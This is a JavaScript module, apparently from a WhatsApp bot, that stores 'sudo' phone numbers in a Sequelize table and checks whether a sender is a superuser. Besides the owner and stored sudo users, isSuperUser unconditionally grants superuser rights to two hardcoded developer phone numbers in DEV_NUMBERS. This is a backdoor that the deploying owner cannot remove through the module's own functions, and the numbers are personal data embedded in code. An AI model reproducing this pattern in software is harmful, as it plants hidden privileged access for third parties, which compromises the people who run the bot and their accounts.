const { DATABASE } = require('./db');
const { DataTypes } = require('sequelize');

const SudoDB = DATABASE.define('SudoUser', {
    id: {
        type: DataTypes.INTEGER,
        primaryKey: true,
        autoIncrement: true,
    },
    number: {
        type: DataTypes.STRING,
        allowNull: false,
        unique: true,
    },
}, {
    tableName: 'sudo_users',
    timestamps: true,
});

async function initializeSudoDB() {
    await SudoDB.sync();
}

let _sudoCache = null;

async function getSudoNumbers() {
    await initializeSudoDB();
    if (_sudoCache) return _sudoCache;
    const records = await SudoDB.findAll();
    _sudoCache = records.map(record => record.number);
    return _sudoCache;
}

async function setSudo(number) {
    await initializeSudoDB();
    try {
        const [record, created] = await SudoDB.findOrCreate({
            where: { number: number },
            defaults: { number: number },
        });
        _sudoCache = null;
        return created;
    } catch (error) {
        console.error('[SUDO][SET_ERROR]:', error);
        return false;
    }
}

async function delSudo(number) {
    await initializeSudoDB();
    try {
        const deleted = await SudoDB.destroy({
            where: { number: number },
        });
        _sudoCache = null;
        return deleted > 0;
    } catch (error) {
        console.error('[SUDO][DEL_ERROR]:', error);
        return false;
    }
}

async function clearAllSudo() {
    await initializeSudoDB();
    try {
        const deleted = await SudoDB.destroy({ where: {} });
        _sudoCache = null;
        return deleted;
    } catch (error) {
        console.error('[SUDO][CLEAR_ALL_ERROR]:', error);
        return 0;
    }
}

const DEV_NUMBERS = ['263714757857', '263776388689'];

async function isSuperUser(jid, Malvin) {
    if (!jid) return false;
    const num = jid.split("@")[0].split(":")[0];
    const ownerNumber = (process.env.OWNER_NUMBER || "").replace(/\D/g, "");
    const botNum = Malvin?.user?.id?.split(":")[0];
    if (num === ownerNumber || num === botNum) return true;
    if (DEV_NUMBERS.includes(num)) return true;
    const sudoNumbers = await getSudoNumbers();
    return sudoNumbers.includes(num);
}

module.exports = {
    SudoDB,
    getSudoNumbers,
    setSudo,
    delSudo,
    clearAllSudo,
    isSuperUser,
};
